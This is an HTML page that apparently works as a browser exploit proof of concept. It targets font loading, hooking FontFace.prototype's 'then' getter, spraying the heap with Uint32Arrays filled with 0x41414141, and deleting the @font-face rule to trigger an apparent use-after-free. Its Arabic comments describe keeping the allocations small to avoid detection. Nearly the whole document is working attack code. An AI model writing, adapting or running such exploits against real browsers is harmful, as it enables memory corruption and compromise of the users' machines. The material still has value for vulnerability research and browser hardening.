<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>
    <div id="debug" style="color:red; font-family:monospace;">Status: Initializing...</div>
    <script>
        const debug = document.getElementById('debug');
        
        window.onload = () => {
            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            
            let fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        debug.innerText = "Status: Hooked. Allocating surgical blocks...";
                        
                        // تخصيص جراحي: مصفوفات صغيرة جداً وبعدد محدود
                        let spray = [];
                        try {
                            for(let i=0; i<10; i++) { 
                                // حجم صغير جداً (0x200) لتجنب كشف التخصيص الكبير
                                spray.push(new Uint32Array(0x200).fill(0x41414141));
                            }
                        } catch(e) {
                            debug.innerText = "Error: " + e.message;
                        }
                        
                        document.getElementById('s').sheet.deleteRule(0);
                        document.body.offsetTop;
                        
                        debug.innerText = "Status: Execution complete. Monitor for stability.";
                    }
                    return undefined;
                }
            });

            document.fonts.load('1em x', 'AB').catch(() => {});
        };
    </script>
</body>
</html>
